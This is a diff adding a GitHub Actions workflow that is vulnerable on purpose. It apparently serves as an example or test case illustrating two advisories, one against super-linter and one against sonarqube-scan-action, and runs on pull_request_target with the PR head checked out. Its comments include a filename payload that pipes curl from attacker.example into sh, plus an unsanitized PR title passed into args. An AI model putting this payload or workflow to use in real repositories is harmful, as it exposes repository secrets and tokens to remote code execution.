@@ -1,0 +1,45 @@
+# situation: on pull_request_target, a job checks out the head of the pull
+#   request with actions/checkout v4.2.2 and runs super-linter/super-linter
+#   pinned to the commit of v8.3.0 over the checkout, and a job on a Windows
+#   runner uses SonarSource/sonarqube-scan-action pinned to the commit of v5.3.1
+#   with the title of the pull request in its input args. The advisories name no
+#   workflow; the steps that use the actions follow the configurations that the
+#   advisories describe: GHSA-r79c-pqj3-577x, an attacker who can "run workflows
+#   without any approval" on a pull request that adds a file, and
+#   GHSA-5xq9-5g24-4g6f, "when workflows pass user-controlled input to the args
+#   parameter on Windows runners". On pull_request, the author of a pull request
+#   from a fork can change the workflow and gets a GITHUB_TOKEN with read access
+#   only, so the example runs on pull_request_target, where the job has the
+#   token and the secrets of the base repository.
+# reason: GHSA-r79c-pqj3-577x, which GitHub rates high, says the scripts of
+#   super-linter from 6.0.0 to before 8.3.1 run a command written in the name of
+#   a file that a pull request adds; GHSA-5xq9-5g24-4g6f, which GitHub rates
+#   high, says sonarqube-scan-action from 4.0.0 to before 6.0.0 runs a command
+#   written in args on Windows. Both are in the code of the action, which the
+#   workflow does not show.
+# attack: the author of a pull request from a fork adds a file named
+#   $(curl${IFS}-sSf${IFS}https://attacker.example/x|sh).md, and writes a title
+#   that closes the quoting of args on Windows.
+# attack-run-behavior: super-linter v8.3.0 runs the command substitution in
+#   the name of the file while super-linter lists the changed files, and
+#   sonarqube-scan-action v5.3.1 runs the command in args, each with the token
+#   and the secrets of the job of the base repository.
+# advisory: https://github.com/advisories/GHSA-r79c-pqj3-577x
+# advisory: https://github.com/advisories/GHSA-5xq9-5g24-4g6f
+on: pull_request_target
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: super-linter/super-linter@502f4fe48a81a392756e173e39a861f8c8efe056 # v8.3.0
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+  sonar:
+    runs-on: windows-latest
+    steps:
+      - uses: SonarSource/sonarqube-scan-action@1a6d90ebcb0e6a6b1d87e37ba693fe453195ae25 # v5.3.1
+        with:
+          args: -Dsonar.projectName="${{ github.event.pull_request.title }}"
